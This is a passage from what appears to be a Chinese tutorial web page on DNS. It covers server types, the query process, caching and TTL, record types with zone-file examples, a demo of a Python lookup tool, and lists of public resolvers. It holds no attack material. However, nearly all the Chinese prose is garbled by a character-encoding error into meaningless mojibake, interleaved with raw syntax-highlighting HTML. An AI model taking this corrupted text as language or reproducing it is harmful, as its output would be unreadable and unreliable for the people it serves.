class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         DNSæœåŠ¡å™¨ç±»å‹                     â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-number">1.</span> æ ¹DNSæœåŠ¡å™¨ï¼ˆRoot DNS <span class="hljs-keyword">Server</span>ï¼‰        â”‚<br>â”‚    - å…¨çƒ<span class="hljs-number">13</span>ç»„                            â”‚<br>â”‚    - çŸ¥é“æ‰€æœ‰é¡¶çº§åŸŸæœåŠ¡å™¨çš„åœ°å€          â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">2.</span> é¡¶çº§åŸŸDNSæœåŠ¡å™¨ï¼ˆTLD DNS <span class="hljs-keyword">Server</span>ï¼‰     â”‚<br>â”‚    - ç®¡ç† .comã€.cn ç­‰é¡¶çº§åŸŸ             â”‚<br>â”‚    - çŸ¥é“æ‰€æœ‰æ³¨å†ŒåŸŸçš„æƒå¨æœåŠ¡å™¨          â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">3.</span> æƒå¨DNSæœåŠ¡å™¨ï¼ˆAuthoritative DNSï¼‰    â”‚<br>â”‚    - å­˜å‚¨åŸŸåçš„çœŸå®IPåœ°å€                â”‚<br>â”‚    - ç”±åŸŸåæ‰€æœ‰è€…ç®¡ç†                    â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">4.</span> æœ¬åœ°DNSæœåŠ¡å™¨ï¼ˆ<span class="hljs-keyword">Local</span> DNS <span class="hljs-keyword">Server</span>ï¼‰     â”‚<br>â”‚    - é€šå¸¸ç”±ISPæä¾›                       â”‚<br>â”‚    - ç¼“å­˜æŸ¥è¯¢ç»“æœ                        â”‚<br>â”‚    - ä»£æ›¿å®¢æˆ·ç«¯æ‰§è¡Œé€’å½’æŸ¥è¯¢              â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="3-DNSæŸ¥è¯¢è¿‡ç¨‹">3. DNSæŸ¥è¯¢è¿‡ç¨‹</h2><h3 id="3-1-é€’å½’æŸ¥è¯¢-vs-è¿­ä»£æŸ¥è¯¢">3.1 é€’å½’æŸ¥è¯¢ vs è¿­ä»£æŸ¥è¯¢</h3><p><strong>é€’å½’æŸ¥è¯¢ï¼ˆRecursive Queryï¼‰</strong>ï¼š</p><ul><li>å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚åï¼ŒDNSæœåŠ¡å™¨è´Ÿè´£å®Œæˆæ‰€æœ‰æŸ¥è¯¢</li><li>â€œå¸®æˆ‘æŸ¥åˆ°ç»“æœå†å‘Šè¯‰æˆ‘â€</li></ul><p><strong>è¿­ä»£æŸ¥è¯¢ï¼ˆIterative Queryï¼‰</strong>ï¼š</p><ul><li>DNSæœåŠ¡å™¨åªè¿”å›ä¸‹ä¸€æ­¥åº”è¯¥æŸ¥è¯¢çš„æœåŠ¡å™¨åœ°å€</li><li>â€œæˆ‘ä¸çŸ¥é“ï¼Œä½†ä½ å¯ä»¥å»é—®XXæœåŠ¡å™¨â€</li></ul><h3 id="3-2-å®Œæ•´çš„DNSæŸ¥è¯¢æµç¨‹">3.2 å®Œæ•´çš„DNSæŸ¥è¯¢æµç¨‹</h3><p><strong>åœºæ™¯</strong>ï¼šä½ åœ¨æµè§ˆå™¨è¾“å…¥ <code>www.example.com</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ­¥éª¤<span class="hljs-number">1</span>ï¼šæ£€æŸ¥æœ¬åœ°ç¼“å­˜<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[ä½ çš„ç”µè„‘]</span><br>  â†“<br>å…ˆæŸ¥çœ‹æœ¬åœ°DNSç¼“å­˜<br>  â†“<br>å¦‚æœæœ‰ç¼“å­˜ â†’ ç›´æ¥è¿”å›IP âœ…<br>å¦‚æœæ²¡æœ‰ â†’ ç»§ç»­æŸ¥è¯¢<br><br>æ­¥éª¤<span class="hljs-number">2</span>ï¼šæŸ¥è¯¢æœ¬åœ°DNSæœåŠ¡å™¨<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[ä½ çš„ç”µè„‘]</span> â†’ <span class="hljs-selector-attr">[æœ¬åœ°DNSæœåŠ¡å™¨]</span><br>               ï¼ˆé€šå¸¸æ˜¯è¿è¥å•†çš„DNSï¼‰<br>  â†“<br>æ£€æŸ¥ç¼“å­˜<br>  â†“<br>å¦‚æœæœ‰ â†’ è¿”å›IP âœ…<br>å¦‚æœæ²¡æœ‰ â†’ å¼€å§‹é€’å½’æŸ¥è¯¢<br><br>æ­¥éª¤<span class="hljs-number">3</span>ï¼šæŸ¥è¯¢æ ¹DNSæœåŠ¡å™¨<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[æœ¬åœ°DNS]</span> â†’ <span class="hljs-selector-attr">[æ ¹DNSæœåŠ¡å™¨]</span><br>é—®ï¼šwww<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> çš„IPæ˜¯å¤šå°‘ï¼Ÿ<br>ç­”ï¼šæˆ‘ä¸çŸ¥é“ï¼Œä½† <span class="hljs-selector-class">.com</span> çš„åœ°å€æˆ‘çŸ¥é“ï¼Œå»é—®å®ƒ<br><br>æ­¥éª¤<span class="hljs-number">4</span>ï¼šæŸ¥è¯¢é¡¶çº§åŸŸDNSæœåŠ¡å™¨<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[æœ¬åœ°DNS]</span> â†’ <span class="hljs-selector-attr">[.com DNSæœåŠ¡å™¨]</span><br>é—®ï¼šwww<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> çš„IPæ˜¯å¤šå°‘ï¼Ÿ<br>ç­”ï¼šæˆ‘ä¸çŸ¥é“ï¼Œä½† example<span class="hljs-selector-class">.com</span> çš„æƒå¨DNSæˆ‘çŸ¥é“ï¼Œå»é—®å®ƒ<br><br>æ­¥éª¤<span class="hljs-number">5</span>ï¼šæŸ¥è¯¢æƒå¨DNSæœåŠ¡å™¨<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[æœ¬åœ°DNS]</span> â†’ <span class="hljs-selector-attr">[example.com æƒå¨DNS]</span><br>é—®ï¼šwww<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> çš„IPæ˜¯å¤šå°‘ï¼Ÿ<br>ç­”ï¼š<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span> âœ…<br><br>æ­¥éª¤<span class="hljs-number">6</span>ï¼šè¿”å›ç»“æœå¹¶ç¼“å­˜<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-selector-attr">[æœ¬åœ°DNS]</span> â†’ <span class="hljs-selector-attr">[ä½ çš„ç”µè„‘]</span><br>è¿”å›ï¼š<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>å¹¶ä¸”ç¼“å­˜ç»“æœï¼ˆTTLæ—¶é—´å†…æœ‰æ•ˆï¼‰<br></code></pre></td></tr></table></figure><p><strong>æ—¶é—´æµç¨‹å›¾</strong>ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">æ—¶é—´è½´ï¼š<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-symbol">t0:</span> ç”¨æˆ·è¾“å…¥ www.example.com<br>    â†“<br><span class="hljs-symbol">t1:</span> æŸ¥è¯¢æœ¬åœ°ç¼“å­˜ï¼ˆ<span class="hljs-number">1</span>msï¼‰<br>    â†“<br><span class="hljs-symbol">t2:</span> æŸ¥è¯¢æœ¬åœ°DNSæœåŠ¡å™¨ï¼ˆ<span class="hljs-number">5</span>msï¼‰<br>    â†“<br><span class="hljs-symbol">t3:</span> æœ¬åœ°DNSæŸ¥è¯¢æ ¹æœåŠ¡å™¨ï¼ˆ<span class="hljs-number">50</span>msï¼‰<br>    â†“<br><span class="hljs-symbol">t4:</span> æœ¬åœ°DNSæŸ¥è¯¢.comæœåŠ¡å™¨ï¼ˆ<span class="hljs-number">30</span>msï¼‰<br>    â†“<br><span class="hljs-symbol">t5:</span> æœ¬åœ°DNSæŸ¥è¯¢æƒå¨æœåŠ¡å™¨ï¼ˆ<span class="hljs-number">20</span>msï¼‰<br>    â†“<br><span class="hljs-symbol">t6:</span> è¿”å›ç»“æœç»™ç”¨æˆ·ï¼ˆ<span class="hljs-number">5</span>msï¼‰<br>    â†“<br>æ€»è€—æ—¶ï¼šçº¦ <span class="hljs-number">111</span>ms<br></code></pre></td></tr></table></figure><h3 id="3-3-DNSç¼“å­˜æœºåˆ¶">3.3 DNSç¼“å­˜æœºåˆ¶</h3><p><strong>å¤šçº§ç¼“å­˜</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">1</span>. æµè§ˆå™¨ç¼“å­˜<br>   â”œâ”€â”€ <span class="hljs-params">Chrome:</span> chrome:<span class="hljs-operator">//</span>net-internals<span class="hljs-operator">/</span><span class="hljs-comment">#dns</span><br>   â”œâ”€â”€ <span class="hljs-params">Firefox:</span> about:networking<span class="hljs-comment">#dns</span><br>   â””â”€â”€ ç¼“å­˜æ—¶é—´ï¼šé€šå¸¸å‡ åˆ†é’Ÿ<br><br><span class="hljs-number">2</span>. æ“ä½œç³»ç»Ÿç¼“å­˜<br>   â”œâ”€â”€ <span class="hljs-params">Windows:</span> ipconfig <span class="hljs-symbol">/displaydns</span><br>   â”œâ”€â”€ <span class="hljs-params">Linux:</span> nscd<br>   â””â”€â”€ ç¼“å­˜æ—¶é—´ï¼šæ ¹æ®TTL<br><br><span class="hljs-number">3</span>. è·¯ç”±å™¨ç¼“å­˜<br>   â””â”€â”€ å®¶åº­ç½‘å…³ä¼šç¼“å­˜DNSç»“æœ<br><br><span class="hljs-number">4</span>. æœ¬åœ°DNSæœåŠ¡å™¨ç¼“å­˜<br>   â””â”€â”€ ISPçš„DNSæœåŠ¡å™¨<br>   â””â”€â”€ ç¼“å­˜æ—¶é—´ï¼šæ ¹æ®TTL<br><br><span class="hljs-number">5</span>. æƒå¨DNSæœåŠ¡å™¨<br>   â””â”€â”€ æœ€ç»ˆçš„çœŸå®æ•°æ®æº<br></code></pre></td></tr></table></figure><p><strong>TTLï¼ˆTime To Liveï¼‰</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNSè®°å½•éƒ½æœ‰TTLå€¼ï¼Œè¡¨ç¤ºç¼“å­˜æœ‰æ•ˆæœŸ<br><br>ç¤ºä¾‹ï¼š<br>www.example.com.  300  IN  A  93.184.216.34<br><span class="hljs-code">                   â†‘</span><br><span class="hljs-code">                  TTL = 300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰</span><br><span class="hljs-code"></span><br>å«ä¹‰ï¼š<br><span class="hljs-bullet">-</span> è¿™æ¡è®°å½•å¯ä»¥è¢«ç¼“å­˜5åˆ†é’Ÿ<br><span class="hljs-bullet">-</span> 5åˆ†é’Ÿåéœ€è¦é‡æ–°æŸ¥è¯¢<br><span class="hljs-bullet">-</span> TTLçŸ­ï¼šæ›´æ–°å¿«ï¼Œä½†æŸ¥è¯¢é¢‘ç¹<br><span class="hljs-bullet">-</span> TTLé•¿ï¼šæŸ¥è¯¢å°‘ï¼Œä½†æ›´æ–°æ…¢<br></code></pre></td></tr></table></figure><hr><h2 id="4-DNSè®°å½•ç±»å‹">4. DNSè®°å½•ç±»å‹</h2><h3 id="4-1-å¸¸è§DNSè®°å½•ç±»å‹">4.1 å¸¸è§DNSè®°å½•ç±»å‹</h3><table><thead><tr><th>è®°å½•ç±»å‹</th><th>å…¨ç§°</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><strong>A</strong></td><td>Address</td><td>IPv4åœ°å€</td><td><code>www.example.com â†’ 93.184.216.34</code></td></tr><tr><td><strong>AAAA</strong></td><td>IPv6 Address</td><td>IPv6åœ°å€</td><td><code>www.example.com â†’ 2606:2800:220:1:...</code></td></tr><tr><td><strong>CNAME</strong></td><td>Canonical Name</td><td>åˆ«å</td><td><code>blog.example.com â†’ www.example.com</code></td></tr><tr><td><strong>MX</strong></td><td>Mail Exchange</td><td>é‚®ä»¶æœåŠ¡å™¨</td><td><code>example.com â†’ mail.example.com</code></td></tr><tr><td><strong>NS</strong></td><td>Name Server</td><td>åŸŸåæœåŠ¡å™¨</td><td><code>example.com â†’ ns1.example.com</code></td></tr><tr><td><strong>TXT</strong></td><td>Text</td><td>æ–‡æœ¬ä¿¡æ¯</td><td><code>SPFã€DKIMç­‰éªŒè¯ä¿¡æ¯</code></td></tr><tr><td><strong>PTR</strong></td><td>Pointer</td><td>åå‘è§£æ</td><td><code>34.216.184.93.in-addr.arpa â†’ www.example.com</code></td></tr><tr><td><strong>SOA</strong></td><td>Start of Authority</td><td>æˆæƒèµ·å§‹</td><td>åŸŸçš„ç®¡ç†ä¿¡æ¯</td></tr><tr><td><strong>SRV</strong></td><td>Service</td><td>æœåŠ¡ä½ç½®</td><td>ç‰¹å®šæœåŠ¡çš„ä¸»æœºå’Œç«¯å£</td></tr></tbody></table><h3 id="4-2-è®°å½•ç±»å‹è¯¦è§£">4.2 è®°å½•ç±»å‹è¯¦è§£</h3><p><strong>Aè®°å½•ï¼ˆæœ€å¸¸ç”¨ï¼‰</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç”¨é€”ï¼šå°†åŸŸåè§£æä¸ºIPv4åœ°å€<br><br>é…ç½®ç¤ºä¾‹ï¼š<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.34</span><br>api.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.35</span><br>cdn.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">104.16.132.229</span><br><br>ä¸€ä¸ªåŸŸåå¯ä»¥æœ‰å¤šä¸ª<span class="hljs-keyword">A</span>è®°å½•ï¼ˆè´Ÿè½½å‡è¡¡ï¼‰ï¼š<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.34</span><br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.35</span><br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.36</span><br></code></pre></td></tr></table></figure><p><strong>AAAAè®°å½•</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç”¨é€”ï¼šå°†åŸŸåè§£æä¸ºIPv6åœ°å€<br><br>é…ç½®ç¤ºä¾‹ï¼š<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">AAAA</span>  <span class="hljs-number">2606:2800:220:1:248:1893:25c8:1946</span><br></code></pre></td></tr></table></figure><p><strong>CNAMEè®°å½•</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç”¨é€”ï¼šåˆ›å»ºåŸŸååˆ«å<br><br>é…ç½®ç¤ºä¾‹ï¼š<br>www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.     IN  A      <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.    IN  CNAME  www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>forum<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.   IN  CNAME  www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br><br>è§£æè¿‡ç¨‹ï¼š<br>ç”¨æˆ·è®¿é—® blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>  â†“ CNAME<br>æŒ‡å‘ www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>  â†“ Aè®°å½•<br>è§£æä¸º <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>æ³¨æ„ï¼šCNAMEä¸èƒ½ä¸å…¶ä»–è®°å½•å…±å­˜<br></code></pre></td></tr></table></figure><p><strong>MXè®°å½•</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç”¨é€”ï¼šæŒ‡å®šé‚®ä»¶æœåŠ¡å™¨<br><br>é…ç½®ç¤ºä¾‹ï¼š<br>example<span class="hljs-selector-class">.com</span>.    IN  MX  <span class="hljs-number">10</span>  mail1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>example<span class="hljs-selector-class">.com</span>.    IN  MX  <span class="hljs-number">20</span>  mail2<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>                      â†‘<br>                   ä¼˜å…ˆçº§ï¼ˆè¶Šå°è¶Šä¼˜å…ˆï¼‰<br><br>é‚®ä»¶å‘é€è¿‡ç¨‹ï¼š<br>å‘é€åˆ° user@example<span class="hljs-selector-class">.com</span><br>  â†“<br>æŸ¥è¯¢ example<span class="hljs-selector-class">.com</span> çš„ MXè®°å½•<br>  â†“<br>æ‰¾åˆ° mail1<span class="hljs-selector-class">.example</span>.comï¼ˆä¼˜å…ˆçº§<span class="hljs-number">10</span>ï¼‰<br>  â†“<br>æŸ¥è¯¢ mail1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> çš„ Aè®°å½•<br>  â†“<br>è·å¾—é‚®ä»¶æœåŠ¡å™¨IPï¼Œå‘é€é‚®ä»¶<br></code></pre></td></tr></table></figure><p><strong>NSè®°å½•</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç”¨é€”ï¼šæŒ‡å®šåŸŸåæœåŠ¡å™¨<br><br>é…ç½®ç¤ºä¾‹ï¼š<br>example<span class="hljs-selector-class">.com</span>.    IN  NS  ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>example<span class="hljs-selector-class">.com</span>.    IN  NS  ns2<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br><br>é€šå¸¸é…ç½®å¤šä¸ªNSè®°å½•ï¼ˆå†—ä½™å¤‡ä»½ï¼‰<br></code></pre></td></tr></table></figure><p><strong>TXTè®°å½•</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç”¨é€”ï¼šå­˜å‚¨æ–‡æœ¬ä¿¡æ¯ï¼ˆå¸¸ç”¨äºéªŒè¯ï¼‰<br><br>é…ç½®ç¤ºä¾‹ï¼š<br><br><span class="hljs-number">1</span>. SPFè®°å½•ï¼ˆé˜²æ­¢é‚®ä»¶ä¼ªé€ ï¼‰ï¼š<br>   example<span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;v=spf1 mx include:_spf.google.com ~all&quot;</span><br><br><span class="hljs-number">2</span>. DKIMï¼ˆé‚®ä»¶ç­¾åï¼‰ï¼š<br>   selector._domainkey<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;v=DKIM1; k=rsa; p=MIGfMA...&quot;</span><br><br><span class="hljs-number">3</span>. åŸŸåéªŒè¯ï¼š<br>   example<span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;google-site-verification=rXOxyZounnZasA8Z7oaD3c14JdjS9aKSWvsR1EbUSIQ&quot;</span><br></code></pre></td></tr></table></figure><p><strong>PTRè®°å½•ï¼ˆåå‘è§£æï¼‰</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ç”¨é€”ï¼šä»IPåœ°å€æŸ¥è¯¢åŸŸå<br><br>é…ç½®ç¤ºä¾‹ï¼š<br><span class="hljs-number">34.216.184.93</span>.in-addr.arpa.  IN  PTR  www.example.com.<br><br>åº”ç”¨åœºæ™¯ï¼š<br>- é‚®ä»¶æœåŠ¡å™¨éªŒè¯<br>- å®‰å…¨å®¡è®¡<br>- æ—¥å¿—åˆ†æ<br></code></pre></td></tr></table></figure><hr><h2 id="5-å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·">5. å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·</h2><h3 id="5-1-é¡¹ç›®åŠŸèƒ½">5.1 é¡¹ç›®åŠŸèƒ½</h3><p>æˆ‘ä»¬å°†å®ç°ä¸€ä¸ªDNSæŸ¥è¯¢å·¥å…·ï¼Œæ”¯æŒï¼š</p><ol><li>æŸ¥è¯¢å„ç§DNSè®°å½•ç±»å‹</li><li>æŒ‡å®šDNSæœåŠ¡å™¨</li><li>æ˜¾ç¤ºè¯¦ç»†çš„æŸ¥è¯¢ç»“æœ</li><li>æ€§èƒ½åˆ†æï¼ˆæŸ¥è¯¢æ—¶é—´ï¼‰</li></ol><h3 id="5-2-å·¥å…·æ¼”ç¤º">5.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥è¯¢Aè®°å½•</span><br>python day12_dns_tool.py www.baidu.com<br><br><span class="hljs-comment"># æŸ¥è¯¢æŒ‡å®šç±»å‹</span><br>python day12_dns_tool.py www.baidu.com MX<br><br><span class="hljs-comment"># æŒ‡å®šDNSæœåŠ¡å™¨</span><br>python day12_dns_tool.py www.baidu.com A 8.8.8.8<br><br><span class="hljs-comment"># æŸ¥è¯¢æ‰€æœ‰è®°å½•</span><br>python day12_dns_tool.py example.com ALL<br></code></pre></td></tr></table></figure><hr><h2 id="6-çŸ¥è¯†æ‹“å±•">6. çŸ¥è¯†æ‹“å±•</h2><h3 id="6-1-å…¬å…±DNSæœåŠ¡å™¨">6.1 å…¬å…±DNSæœåŠ¡å™¨</h3><p><strong>å›½å†…å…¬å…±DNS</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é˜¿é‡ŒDNSï¼š<br><span class="hljs-bullet">- </span>223.5.5.5<br><span class="hljs-bullet">- </span>223.6.6.6<br><br>è…¾è®¯DNSï¼š<br><span class="hljs-bullet">- </span>119.29.29.29<br><br>ç™¾åº¦DNSï¼š<br><span class="hljs-bullet">- </span>180.76.76.76<br><br>114DNSï¼š<br><span class="hljs-bullet">- </span>114.114.114.114<br></code></pre></td></tr></table></figure><p><strong>å›½é™…å…¬å…±DNS</strong>ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Google</span> DNSï¼š<br>- <span class="hljs-number">8.8.8.8</span><br>- <span class="hljs-number">8.8.4.4</span><br><br>Cloudflare DNSï¼š<br>- <span class="hljs-number">1.1.1.1</span><br>- <span class="hljs-number">1.0.0.1</span><br><br>OpenDNSï¼š<br>- <span class="hljs-number">208.67.222.222</span><br>- <span 